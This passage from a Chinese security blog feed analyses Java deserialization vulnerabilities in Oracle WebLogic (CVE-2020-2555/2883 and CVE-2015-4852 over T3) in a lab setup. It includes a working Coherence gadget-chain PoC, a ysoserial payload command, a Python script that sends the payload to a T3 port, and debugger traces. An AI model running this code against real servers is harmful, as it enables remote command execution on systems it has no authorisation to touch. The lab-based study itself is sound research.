class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">gadget:</span><br><span class="line"> BadAttributeValueExpException.readObject()</span><br><span class="line"> com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">               com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                   com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                       ...</span><br><span class="line">                       Runtime.getRuntime.exec()<span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * author:Y4er.com</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * gadget:</span></span><br><span class="line"><span class="comment"> *      BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment"> *          com.tangosol.util.filter.LimitFilter.toString()</span></span><br><span class="line"><span class="comment"> *              com.tangosol.util.extractor.ChainedExtractor.extract()</span></span><br><span class="line"><span class="comment"> *                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span></span><br><span class="line"><span class="comment"> *                      Method.invoke()</span></span><br><span class="line"><span class="comment"> *                      ...</span></span><br><span class="line"><span class="comment"> *                      Runtime.getRuntime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Runtime.class.getRuntime()</span></span><br><span class="line">        ReflectionExtractor extractor1 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"getMethod"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get invoke() to execute exec()</span></span><br><span class="line">        ReflectionExtractor extractor2 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"invoke"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// invoke("exec","calc")</span></span><br><span class="line">        ReflectionExtractor extractor3 = <span class="keyword">new</span> ReflectionExtractor(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        ReflectionExtractor[] extractors = &#123;</span><br><span class="line">                extractor1,</span><br><span class="line">                extractor2,</span><br><span class="line">                extractor3,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedExtractor chainedExtractor = <span class="keyword">new</span> ChainedExtractor(extractors);</span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//m_comparator</span></span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//m_oAnchorTop</span></span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException toString()</span></span><br><span class="line">        <span class="comment">// This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line">        <span class="comment">// https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, limitFilter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样，命令链不再赘述，还是分析不同的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// limitFilter.m_comparator=chainedExtractor</span></span><br><span class="line">      LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line">      Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">      m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//limitFilter.m_oAnchorTop=Runtime.class</span></span><br><span class="line">      Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">      m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// badAttributeValueExpException.val=limitFilter</span></span><br><span class="line">      BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">      Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">      field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      field.set(badAttributeValueExpException, limitFilter);</span><br></pre></td></tr></table></figure><p>从反序列化入口开始分析：</p><p> BadAttributeValueExpException.readObject()-&gt;limitFilter.toString()</p><p><img src="/imgs/image-20200805155956061.png" alt="image-20200805155956061"></p><p>limitFilter.toString()调用extractor.extract(this.m_oAnchorBottom)，即extractor.extract(Runtime.class)，从而调用ChainedExtractor.extract(Runtime.class)，所以这里可以看出一开始没有构造Runtime.class，是需要这里传入<img src="/imgs/image-20200805160242650.png" alt="image-20200805160242650"></p><p>由于CVE-2020-2555在com.tangosol.util.filter.LimitFilter.toString()这里打了补丁，所以CVE-2020-2883是去绕过这个这个补丁或者寻找新的类来触发ChainedExtractor.extract(Runtime.class)</p><h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>如果我们想通过反序列化来自动触发命令执行，通过上面的分析可以获取一个思路：</p><ol><li>首先找到<strong>命令执行链</strong>，这个链的形成往往需要以下条件：相关的类都继承了同一个父类；并且这些类的实现了接口的方法，这个方法可以执行我们传入的参数，类的获取是通过类名，方法的执行是通过反射机制，而且需要一个chain类来连接这些方法的执行</li><li>然后我们需要去找一个反序列化入口-某个类的readObject()，这个readObject()需要去调用某个方法然后通过直接或间接利用其它类的方法调用去执行chain类的方法</li></ol><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC" target="_blank" rel="noopener">MagicZer0/Weblogic_CVE-2020-2883_POC</a></p><p><a href="https://github.com/Y4er/CVE-2020-14645" target="_blank" rel="noopener">Y4er/CVE-2020-14645</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> WebLogic </category>
          
          <category> T3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
            <tag> T3 </tag>
            
            <tag> CVE-2020-2883 </tag>
            
            <tag> CVE-2020-2555 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic系列漏洞学习之T3：CVE-2015-4852</title>
      <link href="2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/"/>
      <url>2020/07/29/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2015-4852/</url>
      
        <content type="html"><![CDATA[<p>本文已投稿雷神众测公众号：<a href="https://mp.weixin.qq.com/s/iyhfeWofVoq0VBQ35vGUCQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iyhfeWofVoq0VBQ35vGUCQ</a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>15年由<a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">FoxGlove</a>团队爆出的Java反序列化漏洞，让weblogic、Websphere、Jenkins等都纷纷中招，本文以WebLogic漏洞来进行探索，也算是老生常谈。虽然网上有一些分析CVE-2015-4852的文章，但是有很多地方对于我这样的小白不太能理解，还有很多直接对CommonsCollections分析的，不能解答我的困惑。在开始分析前，先记录下，有两个问题需要我探索。</p><ol><li>为什么CommonsCollections能在WebLogic中经过T3自动引发？<strong>在收到数据后Weblogic到底怎么操作然后调用CommonsCollections的</strong>？</li><li>为什么CommonsCollections<strong>能够引起命令执行</strong>，需要什么条件？有哪些类是类似的？</li></ol><p>文笔粗糙，如有不当，请各位师傅批评指正。</p><h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境：centos7.3； docker + docker-compose</p><ul><li>vim Dockerfile</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/weblogic</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> debugFlag true</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">7001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8453</span></span><br></pre></td></tr></table></figure><ul><li>vim docker-compose.yml</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">"7001:7001"</span></span><br><span class="line">      - <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure><ul><li>docker-compose up -d</li><li>本地访问192.168.132:7001</li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>先生成反序列化文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure><p>用之前学习T3时的<a href="/2020/07/22/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/">脚本</a>发送恶意数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.116.132'</span>,<span class="string">'7001'</span>,<span class="string">'E:\poc.ser'</span>)</span><br></pre></td></tr></table></figure><p>进入容器，验证是否执行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 363 bash</span><br><span class="line">ls /tmp</span><br></pre></td></tr></table></figure><p>成功创建success文件</p><p><img src="/imgs/image-20200722160553546.png" alt="image-20200722160553546"></p><h2 id="0x02-深入分析"><a href="#0x02-深入分析" class="headerlink" title="0x02 深入分析"></a>0x02 深入分析</h2><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p>搭建环境复现的时候我们已经对容器开去了远程调试服务，下面只需要对本地IDEA环境进行部署。</p><p>首先从容器拷贝root目录，然后单独将相关的jar包拷贝出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp 363:/root .</span><br><span class="line">mkdir jar_lib</span><br><span class="line">find ./ -name *.jar -<span class="built_in">exec</span> cp &#123;&#125; jar_lib/ \;</span><br></pre></td></tr></table></figure><p>将上述jar_lib和root放到本地，然后用IDEA打开root/Oracle/Middleware/wlserver_10.3，将jar_lib加入libraries</p><p><img src="/imgs/image-20200722164315987.png" alt="image-20200722164315987"></p><p>选择weblogic自带的jdk root/jdk/jdk1.6.0_45</p><p><img src="/imgs/image-20200722170913658.png" alt="image-20200722170913658"></p><p>添加远程JVM</p><p><img src="/imgs/image-20200722171057111.png" alt="image-20200722171057111"></p><p>然后debug，出现下图说明连接上了远程JVM</p><p><img src="/imgs/image-20200722171319833.png" alt="image-20200722171319833"></p><h3 id="Weblogic源码分析"><a href="#Weblogic源码分析" class="headerlink" title="Weblogic源码分析"></a>Weblogic源码分析</h3><p>ok，到这里我们万事俱备，只差Debug的入口，从哪里入口是一个难题。</p><p>首先我考虑的是T3相关的jar，那肯定T3相关的处理能拦截到，但是在weblogic.jar下面找了几个T3的试了下都不成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic.common.T3Connection <span class="comment">#不能拦截</span></span><br><span class="line">weblogic.common.T3Client <span class="comment">#不能拦截</span></span><br><span class="line">weblogic.rjvm.t3.ProtocolHandlerT3 <span class="comment">#能拦截，但是只要发送包就会拦截，发送协议头就被拦截了，不符合要求</span></span><br></pre></td></tr></table></figure><p>然后在我有点绝望的时候，在<a href="https://blog.csdn.net/simonnews/article/details/105765017" target="_blank" rel="noopener">Weblogic漏洞Java反序列化CVE-2015-4852解析</a>博客中发现有说明漏洞的补丁情况</p><p><img src="/imgs/image-20200722234401540.png" alt="image-20200722234401540"></p><p>所以就想我为什么不能在这些地方打断点分析呢？通过快捷键（双击shift）查找，找到了这些类的位置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev</span><br><span class="line">wlthint3client.jar:weblogic.rjvm.MsgAbbrevInputStream</span><br><span class="line">weblogic.jar:weblogic.iiop.Utils</span><br></pre></td></tr></table></figure><p>在wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev:23行这里打断点试试，然后执行脚本，成功拦截</p><p><img src="/imgs/image-20200723000811203.png" alt="image-20200723000811203"></p><p>参数var1.head可以看到是我们发送的包含了反序列化数据的包，InboundMsgAbbrev#read()应该是处理从客户端接收到的数据进行读取</p><p><img src="/imgs/image-20200723004828247.png" alt="image-20200723004828247"></p><p>往下执行到readObject，我们F7进入该方法进行分析</p><p><img src="/imgs/image-20200723102516480.png" alt="image-20200723102516480"></p><p>执行var1.read，继续F7深入</p><p><img src="/imgs/image-20200723010242010.png" alt="image-20200723010242010"></p><p>进入到readObject()，往下执行var2=0进入case 0，return (new InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject();</p><p>我们先分析new InboundMsgAbbrev.ServerChannelInputStream(var1)</p><p><img src="/imgs/image-20200723011015134.png" alt="image-20200723011015134"></p><p>进入后，继续深入getServerChannel()</p><p><img src="/imgs/image-20200723011309520.png" alt="image-20200723011309520"></p><p>然后进入到weblogic.rjvm.MsgAbbrevInputStream#getServerChannel()，这个类就是我们刚刚看到的打补丁的第二个地方</p><p><img src="/imgs/image-20200723011634515.png" alt="image-20200723011634515"></p><p>继续深入getChannel看看，这次不是在同一个jar了，进入到了 weblogic.jar:weblogic.rjvm.t3.MuxableSocketT3.T3MsgAbbrevJVMConnection#getChannel()，这里是刚开始找debug入口时看到的类，处理T3协议的socket</p><p><img src="/imgs/image-20200723011954330.png" alt="image-20200723011954330"></p><p>继续深入进入weblogic.socket.BaseAbstractMuxableSocket（BaseAbstractMuxableSocket implements MuxableSocket, SocketRuntime, ContextHandler, Serializable）</p><p><img src="/imgs/image-20200723012246853.png" alt="image-20200723012246853"></p><p>返回了channel，这个时候看到了(“AS:” + MsgAbbrevJVMConnection.ABBREV_TABLE_SIZE + “\n” + “HL” + “:” + 19 + “\n\n”)跟之前学习T3的包联系上了</p><p><img src="/imgs/image-20200723012342993.png" alt="image-20200723012342993"></p><p>继续执行，一步步返回到了最初的位置，这个时候完成了ServerChannelInputStream的实例，其实到这里我们可以看出经过这几个步骤，能够对传入的socket进行T3的处理，获取到信息流。接下来调用readObject，我们需要认真分析下这个</p><p><img src="/imgs/image-20200723012632169.png" alt="image-20200723012632169"></p><p>进入ChunkedObjectInputStream#read(),curEndEnvelop=-1，调用super.read()，F7进入read()</p><p><img src="/imgs/image-20200723110516481.png" alt="image-20200723110516481"></p><p>进入到了ChunkedInputStream#read()，该方法主要是读取head数据也就是我们发送的包</p><p><img src="/imgs/image-20200723111744197.png" alt="image-20200723111744197"></p><p>继续返回ChunkedObjectInputStream#read()，会继续调用ChunkedObjectInputStream#read(var1,var2,var3)以及ChunkedInputStream#read(var1,var2,var3)，往后执行，发现这几个方法是对数据流进行分块处理，按照<code>7870</code>即xp将序列化部分分块，依次解析每块的类，然后去执行</p><p><img src="/imgs/image-20200723153407271.png" alt="image-20200723153407271"></p><p>以下为分析过程中记录的每个分块的类的通过<strong>resolveClass()</strong>方法进行的解析</p><p>chunkedpos从109-239，sun.reflect.annotation.AnnotationInvocationHandler</p><p><img src="/imgs/image-20200723161034461.png" alt="image-20200723161034461"></p><p>chunkedpos从239-393，org.apache.commons.collections.map.TransformedMap</p><p><img src="/imgs/image-20200723163029568.png" alt="image-20200723163029568"></p><p>chunkedpos从239-533，org.apache.commons.collections.functors.ChainedTransformer</p><p><img src="/imgs/image-20200723164920876.png" alt="image-20200723164920876"></p><p>chunkedpos从533-595，[Lorg.apache.commons.collections.Transformer;</p><p><img src="/imgs/image-20200723165303093.png" alt="image-20200723165303093"></p><p>chunkedpos从595-708，org.apache.commons.collections.functors.ConstantTransformer</p><p><img src="/imgs/image-20200723165816296.png" alt="image-20200723165816296"></p><p>chunkedpos从708-742，java.lang.Runtime</p><p><img src="/imgs/image-20200723170135374.png" alt="image-20200723170135374"></p><p>chunkedpos从742-917，org.apache.commons.collections.functors.InvokerTransformer</p><p><img src="/imgs/image-20200723170853261.png" alt="image-20200723170853261"></p><p>chunkedpos从917-953，[Ljava.lang.Object;</p><p><img src="/imgs/image-20200723171216583.png" alt="image-20200723171216583"></p><p>chunkedpos从953-1018，[Ljava.lang.Class;</p><p><img src="/imgs/image-20200723171646692.png" alt="image-20200723171646692"></p><p>chunkedpos从1018-1055，java.lang.String</p><p><img src="/imgs/image-20200723171927667.png" alt="image-20200723171927667"></p><p>chunkedpos从1055-1131，java.lang.Object</p><p><img src="/imgs/image-20200723172637138.png" alt="image-20200723172637138"></p><p>chunkedpos从1131-1256，java.util.HashMap</p><p><img src="/imgs/image-20200723174345127.png" alt="image-20200723174345127"></p><p>chunkedpos从1256-1338，java.lang.annotation.Retention</p><p><img src="/imgs/image-20200723183948828.png" alt="image-20200723183948828"></p><p>根据上面的解析对应到包其实就是下面的图，也就是在反序列化过程中我们调用的类</p><p><img src="/imgs/image-20200723193140849.png" alt="image-20200723193311193"></p><img src="/imgs/image-20200723194727483.png" alt="image-20200723194727483"  /><p>到这里我们解答了一开始提出的第一个问题：为什么CommonsCollections能在WebLogic中经过T3自动引发？<strong>在收到数据后Weblogic到底怎么操作然后调用CommonsCollections的</strong>？也就是刚刚说的wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev将T3数据流的序列化部分依次分块通过resolveClass()来解析类，因为没有在对序列化数据解析时判断他是否安全，没有任何过滤，所以可以直接调用CommonsCollections1中涉及到的所有类。</p><h3 id="CommonsCollections1分析"><a href="#CommonsCollections1分析" class="headerlink" title="CommonsCollections1分析"></a>CommonsCollections1分析</h3><p>第一个调用CommonsCollections的问题我们清楚了，现在需要探讨第二个问题为什么CommonsCollections<strong>能够引起命令执行</strong>？</p><p>网上模仿ysoserial的CommonsCollections1的代码，这里用的是LazyMap利用链</p><p><img src="/imgs/image-20200727142144289.png" alt="image-20200727142144289"></p><p>思路：执行代码生成序列化数据，在这个过程中深入看看到底是怎么执行的命令。这里有个坑，我刚开始执行的时候没有弹出计算器，用的jdk1.8_111，后来换了jdk1.6_45可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2015_4852</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, 